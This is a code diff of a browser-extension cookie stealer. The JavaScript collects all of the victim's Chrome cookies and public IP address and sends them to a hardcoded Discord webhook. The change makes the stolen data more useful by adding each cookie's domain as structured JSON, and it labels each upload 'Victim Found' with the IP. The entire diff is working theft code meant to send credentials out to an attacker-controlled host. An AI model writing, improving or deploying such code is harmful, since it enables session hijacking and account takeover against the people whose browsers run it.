@@ -3,11 +3,14 @@ const WEBHOOK = "https://discord.com/api/webhooks/1072255011184197632/9vmgmgiXwE
 async function main() {
   var ipAddr = await (await fetch("https://api.ipify.org")).text();
 
-  chrome.cookies.getAll({}, async function (cookies) {
-    var cookieString = "";
-
+  chrome.cookies.getAll({}, function (cookies) {
+    var cookiesData = [];
     for (var i = 0; i < cookies.length; i++) {
-      cookieString += cookies[i].name + "=" + cookies[i].value + "; ";
+      cookiesData.push({
+        "name": cookies[i].name,
+        "value": cookies[i].value,
+        "domain": cookies[i].domain
+      });
     }
 
     fetch(WEBHOOK, {
@@ -16,33 +19,24 @@ async function main() {
         "Content-Type": "Application/json"
       },
       body: JSON.stringify({
-        "content": "All Cookies",
+        "content": null,
         "embeds": [
           {
-            "description": "```" + cookieString + "```",
+            "description": "```" + JSON.stringify(cookiesData) + "```",
             "color": null,
-            "fields": [
-              {
-                "name": "IP Address",
-                "value": ipAddr,
-                "inline": true
-              }
-            ],
+            "fields": [],
             "author": {
-              "name": "Cookies Found",
-              "icon_url": "https://icon-library.net/images/cookie-icon-png/cookie-icon-png-27.jpg",
+              "name": "Victim Found: " + ipAddr,
+              "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
             },
             "footer": {
               "text": "https://github.com/ox-y",
               "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
-            },
-            "thumbnail": {
-              "url": "https://icon-library.net/images/cookie-icon-png/cookie-icon-png-27.jpg",
             }
           }
         ],
-        "username": "Cookie Monster",
-        "avatar_url": "https://vignette.wikia.nocookie.net/muppet/images/7/7f/Cookie_Monster_new.png/revision/latest?cb=20131105035131",
+        "username": "Cookies",
+        "avatar_url": "https://www.google.com/favicon.ico",
         "attachments": []
       })
     });
